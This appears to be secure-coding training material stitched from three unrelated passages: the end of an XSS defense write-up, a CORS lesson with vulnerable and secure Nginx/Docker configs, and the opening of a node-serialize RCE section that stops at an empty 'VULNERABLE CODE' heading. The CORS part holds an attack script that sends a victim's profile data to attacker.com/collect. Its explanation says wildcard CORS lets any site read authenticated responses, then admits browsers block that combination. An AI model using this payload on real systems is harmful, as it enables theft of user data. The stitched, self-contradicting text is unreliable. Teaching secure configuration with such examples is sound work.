**Defense in Depth Layers**:
1. **Server-side sanitization (primary XSS barrier)**:
   ```typescript
   const safeComments = rawComments.map((c) => ({
     ...c,
     content: sanitizeUserHtml(c.content)
   }));
   ```
   - Ensures that the HTML generated during SSR is already stripped of scripts, dangerous tags, and event handlers.

2. **Content Security Policy (CSP)**:
   ```typescript
   event.node.res.setHeader('Content-Security-Policy', [
     "default-src 'self'",
     "script-src 'self' 'nonce-abc123'",
     "object-src 'none'"
   ].join('; '));
   ```
   - Limits where scripts can load from and prevents many XSS payloads from executing, even if some HTML slips through.

3. **Rate limiting and audit logging**:
   ```typescript
   if (isRateLimited(ip)) {
     event.node.res.statusCode = 429;
     return { error: 'Too many requests' };
   }

   console.info('Comments served', { postId, count: safeComments.length, ip });
   ```
   - Reduces brute-force or automated injection attempts and provides traceability for suspicious activity.

**Additional Protections**:
- **Environment-specific configuration**: Enable stricter CSP, detailed audit logging, and stricter sanitizer profiles in production while keeping more relaxed settings in development for easier debugging.
- **Validation on input**: On comment creation endpoints, validate content length, allowed tags, and reject obviously malicious inputs early, before storing them in the database.
- **Security headers globally**: Use `X-Content-Type-Options: nosniff`, `X-Frame-Options: SAMEORIGIN`, and a strong `Referrer-Policy`, configured at the reverse proxy (Nginx/Cloudflare) and in Nuxt's Nitro route rules for redundancy.

CORS misconfigurations are one of the most common security issues in containerized APIs. Using wildcard CORS (`*`) is extremely dangerous because it allows ANY website to make authenticated requests to your API and read the responses.

**VULNERABLE CODE**:

```dockerfile
# Dockerfile with vulnerable Nginx CORS configuration
FROM nginx:1.25-alpine

# Copy the vulnerable nginx configuration
COPY nginx.conf /etc/nginx/nginx.conf
COPY default.conf /etc/nginx/conf.d/default.conf

EXPOSE 80
```

```nginx
# default.conf - VULNERABLE CORS configuration
server {
    listen 80;
    server_name api.example.com;

    location /api/ {
        # DANGEROUS: Wildcard allows ANY origin
        add_header 'Access-Control-Allow-Origin' '*' always;
        add_header 'Access-Control-Allow-Methods' 'GET, POST, PUT, DELETE, OPTIONS' always;
        add_header 'Access-Control-Allow-Headers' '*' always;
        add_header 'Access-Control-Allow-Credentials' 'true' always;

        # Proxy to backend
        proxy_pass http://backend:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

**Attack Payload**:
```html
<!-- Malicious site: attacker.com/steal.html -->
<script>
// Attacker's page exploits CORS wildcard to steal data
fetch('https://api.example.com/api/user/profile', {
    method: 'GET',
    credentials: 'include'  // Send victim's cookies
})
.then(response => response.json())
.then(data => {
    // Exfiltrate stolen data to attacker's server
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
</script>
```

**Why This Is Dangerous**:
- `Access-Control-Allow-Origin: *` permits requests from ANY domain
- Combined with `Access-Control-Allow-Credentials: true`, this allows session hijacking (note: browsers block this combo, but the config intent is dangerous)
- `Access-Control-Allow-Headers: *` permits arbitrary headers including custom authentication tokens
- Attackers can create phishing sites that steal authenticated user data

**SECURE VERSION**:

```dockerfile
# Dockerfile with secure Nginx CORS configuration
FROM nginx:1.25-alpine

# Create non-root user for security
RUN addgroup -g 1001 -S nginx-secure && \
    adduser -u 1001 -S nginx-secure -G nginx-secure

# Copy secure configurations
COPY nginx.conf /etc/nginx/nginx.conf
COPY default-secure.conf /etc/nginx/conf.d/default.conf
COPY allowed-origins.conf /etc/nginx/allowed-origins.conf

# Set proper permissions
RUN chown -R nginx-secure:nginx-secure /var/cache/nginx && \
    chown -R nginx-secure:nginx-secure /var/log/nginx && \
    touch /var/run/nginx.pid && \
    chown nginx-secure:nginx-secure /var/run/nginx.pid

USER nginx-secure
EXPOSE 8080
```

```nginx
# default-secure.conf - SECURE CORS configuration
server {
    listen 8080;
    server_name api.example.com;

    # Include allowed origins whitelist
    include /etc/nginx/allowed-origins.conf;

    location /api/ {
        # Validate Origin against whitelist
        if ($cors_origin = '') {
            return 403;
        }

        # Only allow whitelisted origins
        add_header 'Access-Control-Allow-Origin' $cors_origin always;
        add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS' always;
        add_header 'Access-Control-Allow-Headers' 'Content-Type, Authorization' always;
        add_header 'Access-Control-Max-Age' '86400' always;

        # Security headers
        add_header 'X-Content-Type-Options' 'nosniff' always;
        add_header 'X-Frame-Options' 'DENY' always;
        add_header 'X-XSS-Protection' '1; mode=block' always;

        # Handle preflight requests
        if ($request_method = 'OPTIONS') {
            add_header 'Access-Control-Allow-Origin' $cors_origin;
            add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS';
            add_header 'Access-Control-Allow-Headers' 'Content-Type, Authorization';
            add_header 'Access-Control-Max-Age' '86400';
            add_header 'Content-Length' '0';
            add_header 'Content-Type' 'text/plain';
            return 204;
        }

        proxy_pass http://backend:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

```nginx
# allowed-origins.conf - Whitelist of trusted origins
map $http_origin $cors_origin {
    default '';
    'https://app.example.com' $http_origin;
    'https://admin.example.com' $http_origin;
    'https://mobile.example.com' $http_origin;
}
```

**Key Security Controls**:
- **Origin whitelist**: Only explicitly trusted domains can make cross-origin requests
- **Restricted methods**: Only necessary HTTP methods are allowed (no DELETE/PUT unless needed)
- **Specific headers**: Only required headers are permitted, not wildcards
- **Non-root user**: Container runs as unprivileged user reducing attack surface
- **Security headers**: Additional headers prevent clickjacking and XSS

Using libraries like `node-serialize` to deserialize untrusted data is extremely dangerous and can lead to Remote Code Execution (RCE). This vulnerability class has been actively exploited in the wild, including the infamous CVE-2017-5941 which continues to affect applications in 2024.

**VULNERABLE CODE**:

